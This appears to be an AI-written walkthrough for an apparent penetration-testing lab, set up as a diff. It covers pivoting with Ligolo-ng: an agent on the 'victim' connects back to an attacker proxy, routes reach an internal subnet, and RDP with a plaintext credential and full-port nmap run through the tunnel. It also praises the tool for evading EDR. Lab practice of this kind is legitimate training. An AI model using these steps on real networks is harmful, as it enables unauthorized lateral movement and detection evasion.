@@ -1,0 +1,83 @@
+🔁 Full Step-by-Step Breakdown – Ligolo-ng Tunnel Setup (Your Battle-Tested Version)
+Here’s the exact recipe you followed, cleaned up and structured so you can replicate it flawlessly every time:
+
+🧱 1. Download Ligolo-ng Binaries
+On both attacker and victim, download the binaries:
+
+bash
+Copy
+Edit
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng-agent
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng-proxy
+chmod +x ligolo-ng-*
+🛰️ 2. Run the Agent on the Victim (Web01)
+On the target, connect the agent back to the attacker’s proxy listener:
+
+bash
+Copy
+Edit
+./ligolo-ng-agent -connect <YOUR_IP>:11601 -ignore-cert
+Use -ignore-cert to skip self-signed cert issues.
+
+🛡️ 3. Start the Proxy on Attacker (Parrot Box)
+bash
+Copy
+Edit
+sudo ./ligolo-ng-proxy -laddr 0.0.0.0:11601 -selfcert -v
+Once it shows Agent joined, you're in.
+
+🧭 4. Ligolo-ng CLI - Set Up Tunnel
+Launch the Ligolo CLI if you haven’t already:
+
+bash
+Copy
+Edit
+ligolo-ng
+Then select the active agent:
+
+bash
+Copy
+Edit
+session
+# Then type the session number when prompted
+Now start setting up routing:
+
+bash
+Copy
+Edit
+autoroute
+# Select route like 172.16.5.0/23
+# Choose: Create a new interface
+✅ You resolved the earlier TUNSETIFF error by deleting orphaned interfaces and retrying:
+
+bash
+Copy
+Edit
+sudo ip link delete ligolo
+sudo ip route del 172.16.5.0/24 dev ligolo
+Eventually, Ligolo auto-created an interface like burstingraider, which went UP successfully!
+
+🌐 5. Tunnel Ready - Run Stuff Through It
+With the tunnel active, you were able to:
+
+🔒 RDP:
+bash
+Copy
+Edit
+xfreerdp /u:victor /p:pass@123 /v:172.16.5.19
+🔍 Nmap via Proxychains:
+bash
+Copy
+Edit
+proxychains nmap -sT -Pn -n -p- 172.16.5.19
+✅ Proxychains finally succeeded after Ligolo was set up properly. You confirmed that port 3389 (RDP), 389 (LDAP), and 445 (SMB) were all accessible through the tunnel.
+
+🏁 Final Notes:
+No need for ssh -D tunnels anymore.
+
+Ligolo is agent-based, fast, and doesn't use SSH, making it great for bypassing EDR visibility.
+
+Fully supports multi-hop, unlike old-school SSH pivoting.
+
+
+
